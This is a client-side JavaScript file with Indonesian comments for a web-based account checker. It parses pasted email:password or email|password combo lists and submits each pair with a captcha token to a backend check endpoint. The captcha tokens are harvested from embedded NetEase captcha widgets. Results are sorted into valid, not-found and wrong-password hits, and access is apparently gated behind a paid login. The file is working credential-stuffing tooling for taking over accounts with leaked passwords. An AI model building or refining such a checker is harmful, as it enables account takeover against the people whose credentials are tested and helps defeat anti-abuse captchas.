// File: /public/script.js

// Cek token saat halaman dimuat
const authToken = localStorage.getItem('authToken');
if (!authToken) {
    alert('Anda belum login atau sesi Anda telah habis. Silakan login kembali.');
    window.location.href = '/login.html';
}

// --- State Management ---
let tokens = [];
let accountsToCheck = [];
let isChecking = false;
let currentIndex = 0;
let stats = {
    total: 0, checked: 0, valid: 0,
    notFound: 0, wrongPass: 0, error: 0
};

// --- Element References ---
const accountListEl = document.getElementById('accountList');
const startButton = document.getElementById('startButton');
const stopButton = document.getElementById('stopButton');
const statusEl = document.getElementById('status');
const statsEl = document.getElementById('stats');
const resultsEl = document.getElementById('results');
const tokenCountEl = document.getElementById('tokenCount');

// --- Captcha Logic ---
function updateTokenCounter() {
    tokenCountEl.innerText = tokens.length;
}

function loadCaptcha(captchaId, elementId) {
    initNECaptcha({
        captchaId: captchaId,
        element: elementId,
        mode: "embed",
        onVerify: function (err, data) {
            if (!err) {
                tokens.push(data.validate);
                updateTokenCounter();
                // Muat ulang captcha setelah berhasil
                const container = document.querySelector(elementId);
                container.innerHTML = ''; // Hapus instance lama
                loadCaptcha(captchaId, elementId); 
            }
        }
    }, function(instance) { /* loaded */ }, function(err) { console.error("Captcha error:", err); });
}

const captchaKey = "fef5c67c39074e9d845f4bf579cc07af";
loadCaptcha(captchaKey, "#captcha1");
loadCaptcha(captchaKey, "#captcha2");
loadCaptcha(captchaKey, "#captcha3");

// --- Checker Logic ---
function get_captcha_token() {
    if (tokens.length === 0) return null;
    const token = tokens.shift();
    updateTokenCounter();
    return token;
}

// !!! FUNGSI INI DIUBAH TOTAL UNTUK MENGHUBUNGI BACKEND !!!
async function checkAccount(email, password) {
    const e_captcha = get_captcha_token();
    if (!e_captcha) {
        return { status: 'error', message: 'Token captcha habis!' };
    }

    try {
        const response = await fetch("/api/check", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}` // Kirim token JWT
            },
            body: JSON.stringify({ email, password, e_captcha })
        });
        
        if (!response.ok) {
            // Jika token tidak valid atau langganan habis, server akan merespon error
            if (response.status === 401 || response.status === 403) {
                 const errData = await response.json();
                 alert(errData.message);
                 localStorage.removeItem('authToken'); // Hapus token yg tidak valid
                 window.location.href = '/login.html'; // Redirect ke login
            }
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        const code = data.code;
        const message = data.message || "";

        if (code === 0 && data.data) {
            const guid = data.data.guid || "N/A";
            return { status: 'valid', message: `GUID: ${guid}` };
        } else if (code === 1004) {
            return { status: 'notfound', message: 'Error_NoAccount' };
        } else if (code === 1005) {
            return { status: 'wrongpass', message: 'Error_PasswdError' };
        } else {
            return { status: 'error', message: `Code: ${code} - ${message}` };
        }
    } catch (e) {
        console.error("Fetch Exception:", e);
        tokens.unshift(e_captcha);
        updateTokenCounter();
        return { status: 'error', message: `EXCEPTION: ${e.message}.` };
    }
}
    
// --- Control Flow (Sama seperti kode asli Anda) ---
function updateStats() {
    statsEl.textContent = `Total: ${stats.total} | Checked: ${stats.checked} | Valid: ${stats.valid} | Not Found: ${stats.notFound} | Wrong Pass: ${stats.wrongPass} | Error: ${stats.error}`;
}

function updateStatus(text) {
    statusEl.textContent = `Status: ${text}`;
}

function addResult(account, result) {
    const div = document.createElement('div');
    let resultClass = '', statusText = '';
    switch(result.status) {
        case 'valid': resultClass = 'result-valid'; statusText = '[VALID]'; stats.valid++; break;
        case 'notfound': resultClass = 'result-notfound'; statusText = '[NOT FOUND]'; stats.notFound++; break;
        case 'wrongpass': resultClass = 'result-wrongpass'; statusText = '[WRONG PASS]'; stats.wrongPass++; break;
        case 'error': resultClass = 'result-error'; statusText = '[ERROR]'; stats.error++; break;
    }
    stats.checked++;
    div.className = resultClass;
    div.textContent = `${statusText} ${account} | ${result.message}`;
    resultsEl.prepend(div);
}

function updateAccountListTextarea() {
    const remainingAccounts = accountsToCheck.slice(currentIndex).map(acc => acc.original);
    accountListEl.value = remainingAccounts.join('\n');
}

async function mainLoop() {
    while (isChecking && currentIndex < accountsToCheck.length) {
        const account = accountsToCheck[currentIndex];
        updateStatus(`Checking ${account.email}...`);

        if (tokens.length === 0) {
            updateStatus('Menunggu token captcha... Proses dijeda.');
            while (tokens.length === 0 && isChecking) {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            if (!isChecking) break;
            updateStatus('Token tersedia, melanjutkan proses...');
        }

        const result = await checkAccount(account.email, account.password);
        
        addResult(account.original, result);
        updateStats();

        currentIndex++;
        updateAccountListTextarea();

        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    if (isChecking) {
        updateStatus('Selesai! Semua akun telah dicek.');
        isChecking = false;
        startButton.disabled = false;
        startButton.textContent = 'Mulai Ngecek';
        stopButton.disabled = true;
        accountListEl.disabled = false;
    }
}

startButton.addEventListener('click', () => {
    if (isChecking) return;
    if (currentIndex > 0 && currentIndex < accountsToCheck.length) { // Resume
        isChecking = true;
        startButton.disabled = true;
        stopButton.disabled = false;
        accountListEl.disabled = true;
        startButton.textContent = 'Mengecek...';
        updateStatus('Melanjutkan pengecekan...');
        mainLoop();
    } else { // Start baru
        const rawList = accountListEl.value.trim().split('\n');
        accountsToCheck = rawList.filter(line => line.includes(':') || line.includes('|')).map(line => {
            const separator = line.includes(':') ? ':' : '|';
            const parts = line.split(separator);
            return {
                email: parts[0].trim(),
                password: parts.slice(1).join(separator).trim(),
                original: line
            };
        });
        if (accountsToCheck.length === 0) {
            alert('List akun kosong atau formatnya salah!');
            return;
        }
        isChecking = true;
        currentIndex = 0;
        resultsEl.innerHTML = '';
        stats = { total: accountsToCheck.length, checked: 0, valid: 0, notFound: 0, wrongPass: 0, error: 0 };
        updateStats();
        startButton.disabled = true;
        stopButton.disabled = false;
        accountListEl.disabled = true;
        startButton.textContent = 'Mengecek...';
        mainLoop();
    }
});

stopButton.addEventListener('click', () => {
    if (!isChecking) return;
    isChecking = false;
    startButton.disabled = false;
    stopButton.disabled = true;
    accountListEl.disabled = false;
    startButton.textContent = 'Lanjutkan';
    updateStatus(`Proses dihentikan. Klik Lanjutkan untuk melanjutkan.`);
});